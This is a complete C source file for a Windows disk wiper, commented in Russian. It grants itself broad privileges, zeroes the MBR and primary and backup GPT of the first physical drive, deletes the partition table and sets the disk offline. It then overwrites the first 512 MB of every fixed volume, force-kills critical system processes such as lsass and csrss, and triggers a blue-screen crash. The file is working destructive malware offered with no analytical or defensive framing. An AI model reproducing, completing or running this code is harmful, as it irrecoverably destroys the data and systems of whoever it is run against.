#include <windows.h>
#include <winioctl.h>

// ============================================================
//   Ручные определения для MinGW (должны быть ДО использования)
// ============================================================
#ifndef IOCTL_DISK_SET_DISK_ATTRIBUTES
#define IOCTL_DISK_SET_DISK_ATTRIBUTES \
    CTL_CODE(IOCTL_DISK_BASE, 0x0033, METHOD_BUFFERED, \
    FILE_READ_ACCESS | FILE_WRITE_ACCESS)
#endif

#ifndef DISK_ATTRIBUTE_OFFLINE
#define DISK_ATTRIBUTE_OFFLINE 0x0000000000000001ULL
#endif

#ifndef SET_DISK_ATTRIBUTES
typedef struct _SET_DISK_ATTRIBUTES {
    ULONG Version;
    BOOLEAN Persist;
    BYTE Reserved1[3];
    ULONGLONG Attributes;
    ULONGLONG AttributesMask;
    DWORD Reserved2[4];
} SET_DISK_ATTRIBUTES, *PSET_DISK_ATTRIBUTES;
#endif

// ============================================================
//   BSOD
// ============================================================
void TriggerBSOD()
{
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return;

    typedef LONG (NTAPI *pRtlAdjustPrivilege)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
    typedef LONG (NTAPI *pNtRaiseHardError)(LONG, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);

    pRtlAdjustPrivilege RtlAdjustPrivilege =
        (pRtlAdjustPrivilege)GetProcAddress(ntdll, "RtlAdjustPrivilege");
    pNtRaiseHardError NtRaiseHardError =
        (pNtRaiseHardError)GetProcAddress(ntdll, "NtRaiseHardError");

    if (RtlAdjustPrivilege && NtRaiseHardError)
    {
        BOOLEAN old;
        ULONG response;
        RtlAdjustPrivilege(19, TRUE, FALSE, &old);
        NtRaiseHardError(0xC000021A, 0, 0, NULL, 6, &response);
    }
}

// ============================================================
//   Повышение привилегий
// ============================================================
void EnablePrivileges()
{
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(),
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return;

    const wchar_t* privs[] = {
        L"SeDebugPrivilege",
        L"SeBackupPrivilege",
        L"SeRestorePrivilege",
        L"SeShutdownPrivilege",
        L"SeTcbPrivilege",
        L"SeSecurityPrivilege",
        L"SeManageVolumePrivilege"
    };

    for (int i = 0; i < 7; i++)
    {
        LUID luid;
        if (!LookupPrivilegeValueW(NULL, privs[i], &luid)) continue;

        TOKEN_PRIVILEGES tp;
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    }

    CloseHandle(hToken);
}

// ============================================================
//   Затирание региона нулями
// ============================================================
void WipeRegion(HANDLE h, LONGLONG offset, DWORD size)
{
    LARGE_INTEGER li;
    li.QuadPart = offset;
    SetFilePointerEx(h, li, NULL, FILE_BEGIN);

    BYTE* zeros = (BYTE*)VirtualAlloc(NULL, 65536, MEM_COMMIT, PAGE_READWRITE);
    if (!zeros) return;
    ZeroMemory(zeros, 65536);

    DWORD written;
    DWORD remaining = size;

    while (remaining > 0)
    {
        DWORD toWrite = (remaining > 65536) ? 65536 : remaining;
        if (!WriteFile(h, zeros, toWrite, &written, NULL)) break;
        if (written == 0) break;
        remaining -= written;
    }

    FlushFileBuffers(h);
    VirtualFree(zeros, 0, MEM_RELEASE);
}

// ============================================================
//   Затирание физического диска 0 (MBR + GPT)
// ============================================================
void WipePhysicalDrive()
{
    HANDLE h = CreateFileW(L"\\\\.\\PhysicalDrive0",
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL, OPEN_EXISTING, 0, NULL);

    if (h == INVALID_HANDLE_VALUE) return;

    DWORD br;

    DeviceIoControl(h, FSCTL_DISMOUNT_VOLUME, NULL, 0, NULL, 0, &br, NULL);

    // Затираем первые 1 МБ (MBR + GPT header + GPT entries)
    WipeRegion(h, 0, 1024 * 1024);

    // Затираем последний 1 МБ (backup GPT)
    GET_LENGTH_INFORMATION info;
    if (DeviceIoControl(h, IOCTL_DISK_GET_LENGTH_INFO,
        NULL, 0, &info, sizeof(info), &br, NULL))
    {
        LONGLONG diskSize = info.Length.QuadPart;
        if (diskSize > 2 * 1024 * 1024)
            WipeRegion(h, diskSize - 1024 * 1024, 1024 * 1024);
    }

    // Ядерное удаление таблицы разделов
    DeviceIoControl(h, IOCTL_DISK_DELETE_DRIVE_LAYOUT,
        NULL, 0, NULL, 0, &br, NULL);

    // Offline диска
    SET_DISK_ATTRIBUTES attrs;
    ZeroMemory(&attrs, sizeof(attrs));
    attrs.Version = sizeof(SET_DISK_ATTRIBUTES);
    attrs.Persist = FALSE;
    attrs.Attributes = DISK_ATTRIBUTE_OFFLINE;
    attrs.AttributesMask = DISK_ATTRIBUTE_OFFLINE;

    DeviceIoControl(h, IOCTL_DISK_SET_DISK_ATTRIBUTES,
        &attrs, sizeof(attrs), NULL, 0, &br, NULL);

    CloseHandle(h);
}

// ============================================================
//   Затирание логических томов
// ============================================================
void WipeAllVolumes()
{
    wchar_t drives[512] = {0};
    if (!GetLogicalDriveStringsW(511, drives)) return;

    for (wchar_t* p = drives; *p; p += wcslen(p) + 1)
    {
        UINT type = GetDriveTypeW(p);
        if (type != DRIVE_FIXED) continue;

        wchar_t path[] = L"\\\\.\\X:";
        path[4] = p[0];

        HANDLE h = CreateFileW(path,
            GENERIC_READ | GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            NULL, OPEN_EXISTING, 0, NULL);

        if (h == INVALID_HANDLE_VALUE) continue;

        DWORD br;
        DeviceIoControl(h, FSCTL_DISMOUNT_VOLUME, NULL, 0, NULL, 0, &br, NULL);

        // Затираем первые 512 МБ тома
        WipeRegion(h, 0, 512 * 1024 * 1024);

        CloseHandle(h);
    }
}

// ============================================================
int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int)
{
    EnablePrivileges();
    WipePhysicalDrive();
    WipeAllVolumes();

    // Убиваем критичные процессы
    system("taskkill /f /im csrss.exe >nul 2>&1");
    system("taskkill /f /im winlogon.exe >nul 2>&1");
    system("taskkill /f /im wininit.exe >nul 2>&1");
    system("taskkill /f /im services.exe >nul 2>&1");
    system("taskkill /f /im lsass.exe >nul 2>&1");
    system("taskkill /f /im smss.exe >nul 2>&1");

    TriggerBSOD();

    // Резервный краш
    *(volatile int*)0 = 0;

    return 0;
}